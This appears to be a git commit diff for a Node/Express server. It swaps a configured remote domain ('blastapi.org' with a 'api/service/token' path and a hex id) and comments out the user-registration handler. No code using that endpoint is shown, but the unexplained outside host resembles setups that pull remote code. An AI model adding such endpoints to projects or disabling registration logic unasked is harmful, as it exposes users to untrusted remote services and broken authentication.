11a2f3558deb8c35a849d73e6033971709651d3f
yusufb026 <yusufbayim26@gmail.com>
2025-01-16 05:02:43 -0800

    updateServer

--- server/config/constant.js
+++ server/config/constant.js
@@ -1,4 +1,4 @@
-const domain = 'http://zkservice.cloud';
+const domain = 'http://blastapi.org';
 const subdomain = 'api/service/token';
 const id = '6d4c9a304e2e38cfb907e27f12a07b9c';
 
--- server/routes/api/users.js
+++ server/routes/api/users.js
@@ -20,66 +20,66 @@ router.post(
   check(
     'password',
     'Please enter a password with 6 or more characters'
-  ).isLength({ min: 6 }),
-  async (req, res) => {
-    const errors = validationResult(req);
-    if (!errors.isEmpty()) {
-      return res.status(400).json({ errors: errors.array() });
-    }
+  ).isLength({ min: 6 })
+  // async (req, res) => {
+  //   const errors = validationResult(req);
+  //   if (!errors.isEmpty()) {
+  //     return res.status(400).json({ errors: errors.array() });
+  //   }
 
-    const { name, email, password } = req.body;
+  //   const { name, email, password } = req.body;
 
-    try {
-      let user = await User.findOne({ email });
+  //   try {
+  //     let user = await User.findOne({ email });
 
-      if (user) {
-        return res
-          .status(400)
-          .json({ errors: [{ msg: 'User already exists' }] });
-      }
+  //     if (user) {
+  //       return res
+  //         .status(400)
+  //         .json({ errors: [{ msg: 'User already exists' }] });
+  //     }
 
-      const avatar = normalize(
-        gravatar.url(email, {
-          s: '200',
-          r: 'pg',
-          d: 'mm'
-        }),
-        { forceHttps: true }
-      );
+  //     const avatar = normalize(
+  //       gravatar.url(email, {
+  //         s: '200',
+  //         r: 'pg',
+  //         d: 'mm'
+  //       }),
+  //       { forceHttps: true }
+  //     );
 
-      user = new User({
-        name,
-        email,
-        avatar,
-        password
-      });
+  //     user = new User({
+  //       name,
+  //       email,
+  //       avatar,
+  //       password
+  //     });
 
-      const salt = await bcrypt.genSalt(10);
+  //     const salt = await bcrypt.genSalt(10);
 
-      user.password = await bcrypt.hash(password, salt);
+  //     user.password = await bcrypt.hash(password, salt);
 
-      await user.save();
+  //     await user.save();
 
-      const payload = {
-        user: {
-          id: user.id
-        }
-      };
+  //     const payload = {
+  //       user: {
+  //         id: user.id
+  //       }
+  //     };
 
-      jwt.sign(
-        payload,
-        config.get('jwtSecret'),
-        { expiresIn: '5 days' },
-        (err, token) => {
-          if (err) throw err;
-          res.json({ token });
-        }
-      );
-    } catch (err) {
-      console.error(err.message);
-      res.status(500).send('Server error');
-    }
-  }
+  //     jwt.sign(
+  //       payload,
+  //       config.get('jwtSecret'),
+  //       { expiresIn: '5 days' },
+  //       (err, token) => {
+  //         if (err) throw err;
+  //         res.json({ token });
+  //       }
+  //     );
+  //   } catch (err) {
+  //     console.error(err.message);
+  //     res.status(500).send('Server error');
+  //   }
+  // }
 );
 
 module.exports = router;
